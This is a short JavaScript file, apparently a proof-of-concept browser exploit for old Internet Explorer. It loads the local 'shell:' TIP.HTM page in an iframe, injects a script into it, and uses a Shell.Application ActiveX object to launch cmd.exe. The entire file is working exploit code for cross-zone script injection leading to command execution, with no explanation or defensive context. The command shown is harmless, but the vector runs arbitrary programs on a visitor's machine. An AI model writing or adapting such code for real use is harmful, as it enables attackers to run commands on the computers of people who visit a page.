function injectIt() {
  document.frames[0].document.body.insertAdjacentHTML('afterBegin','injected<script language="JScript" DEFER>var obj=new ActiveXObject("Shell.Application");obj.ShellExecute("cmd.exe","/c pause");</script>');
}
document.write('<iframe src="shell:WINDOWS\\Web\\TIP.HTM"></iframe>');
setTimeout("injectIt()", 1000);